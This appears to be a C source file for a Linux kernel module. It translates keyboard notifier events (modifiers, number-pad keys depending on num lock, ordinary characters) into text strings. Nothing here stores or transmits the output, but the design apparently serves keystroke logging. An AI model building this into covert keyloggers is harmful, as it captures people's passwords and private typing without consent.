#include <linux/keyboard.h>

/*  ledstate masks  */
//ledstate is a flag int (so x flags on a x-bit system)
//ledstate = _ _ _ _ _ ... _ _ _ _
//           3 3 2 2 2 ... 0 0 0 0
//           1 0 9 8 7 ... 3 2 1 0
//                             | |
//nlock bit -------------------+ |
//slock bit ---------------------+
#define SLOCK_MASK 0x0000001  //bit 0 = scroll lock
#define NLOCK_MASK 0x0000002  //bit 1 = num lock

//string representations for common keys
#define UNKNOWN "<unkn>"
#define NO_EFCT "<null>"
#define PG_UP   "<pg up>"
#define PG_DN   "<pg dn>"
#define HOME    "<home>"
#define END     "<end>"
#define ARW_UP  "<u arw>"
#define ARW_DN  "<d arw>"
#define ARW_LT  "<l arw>"
#define ARW_RT  "<r arw>"

typedef struct keyboard_notifier_param keystroke_data;

static void ksym_num(keystroke_data *ks, char *buf);
static void ksym_mod(keystroke_data *ks, char *buf);
static void ksym_std(keystroke_data *ks, char *buf);

//key symbol to string tables
char *mods[4] = {"<shift _>", UNKNOWN, "<ctrl _>", "<alt _>"};
char *locked_npad[17] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
                         "+", "-", "*", "/", "<enter>", UNKNOWN, "."};
char *unlocked_npad[17] = {"<ins>", END, ARW_DN, PG_DN, ARW_LT, NO_EFCT, 
                           ARW_RT, HOME, ARW_UP, PG_UP, "+", "-", "*",
                           "/", "<enter>", UNKNOWN, "."};

/*Wrapper for key symbol translation fucntions.
 *Parses value and selects the appropriate translation function.
 *
 *@param ks_param keystroke data
 *@param buf      output buffer
 */
void xlate_keysym(keystroke_data *ks_param, char *buf) {

  //grab type from key symbol
  //      <----sym---->
  // ...|  typ  |  val  |...
  unsigned char type = ks_param->value >> 8;

  //select appropriate translation function
  switch (type & 0x0f) {
    case 0x0 : 
    case 0x1 :
    case 0x2 :
    case 0x3 : ksym_num(ks_param, buf);  break;
    case 0x4 :
    case 0x5 :
    case 0x6 :
    case 0x7 : ksym_mod(ks_param, buf);  break;
    case 0x8 :
    case 0x9 :
    case 0xa :
    case 0xb : ksym_std(ks_param, buf);  break;
    case 0xc :
    case 0xd :
    case 0xe :
    case 0xf : break;
  }
}

/*Translate normal keys.
 *Return the value on key-press; ignore key-release.
 *
 *@param ks_param keystroke data
 *@param buf      output buffer
 */
static void ksym_std(keystroke_data *ks, char *buf) {
  if (ks->down) sprintf(buf, "%c", ks->value);
  else          buf[0] = 0x00;
}

/*Translate normal modifier keys.
 *Return the appropriate string on both key-press and key-release events.  An
 *event-specific character is added to the strings (p for press, r for
 *release events).
 *
 *@param ks_param keystroke data
 *@param buf      output buffer
 */
static void ksym_mod(keystroke_data *ks, char *buf) {
  int len;
  unsigned char val  = ks->value & 0x00ff;

  //just in case
  if (val > 3) return;

  //translate mod key to string
  len = sprintf(buf, "%s", mods[val]);

  //add pressure indicator
  buf[len - 2] = ks->down ? 'p' : 'r';
}

/*Translate number pad keys.
 *The ledstate field of the keystroke param must be parsed to determine
 *whether numlock is enabled or not.  See defines for more info on how
 *ledstate is handled.
 *
 *@param ks_param keystroke data
 *@param buf      output buffer
 */
static void ksym_num(keystroke_data *ks, char *buf) {
  unsigned char val  = ks->value & 0x00ff;

  //just in case
  if (val > 16) return;

  //ignore key-release events
  if (!ks->down) {
    buf[0] = 0x00;
    return;
  }

  //values depend on the state of numlock
  if (ks->ledstate & NLOCK_MASK)
    sprintf(buf, "%s", locked_npad[val]);
  else if (!(ks->ledstate & NLOCK_MASK))
    sprintf(buf, "%s", unlocked_npad[val]);
}

int disp(unsigned char value) {
  return (value > 0x19 && value < 0x7F);
}
